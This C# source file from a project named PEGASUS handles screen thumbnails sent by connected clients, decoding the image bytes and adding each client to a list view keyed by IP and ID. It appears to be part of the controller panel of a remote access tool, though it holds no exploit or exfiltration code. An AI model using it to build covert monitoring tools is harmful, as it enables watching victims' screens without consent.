namespace PEGASUS.BytesInOut
{
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using System.Drawing;
    using System.IO;
    using System.Windows.Forms;

    /// <summary>
    /// Defines the <see cref="HandleThumbnails" />.
    /// </summary>
    public class HandleThumbnails
    {
        /// <summary>
        /// Initializes a new instance of the <see cref="HandleThumbnails"/> class.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        public HandleThumbnails(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                if (client.LV2 == null)
                {
                    client.LV2 = new ListViewItem();
                    client.LV2.Text = string.Format("{0}:{1}", client.Ip, client.TcpClient.LocalEndPoint.ToString().Split(':')[1]);
                    client.LV2.ToolTipText = client.ID;
                    client.LV2.Tag = client;

                    using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                    {

                        Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
                        client.LV2.ImageKey = client.ID;
                        lock (Settings.LockListviewThumb)
                        {
                            Program.form1.listView3.Items.Add(client.LV2);
                        }
                    }
                }
                else
                {
                    using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                    {
                        lock (Settings.LockListviewThumb)
                        {
                            Program.form1.ThumbnailImageList.Images.RemoveByKey(client.ID);
                            Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
                        }
                    }
                }
            }
            catch { }
        }
    }
}
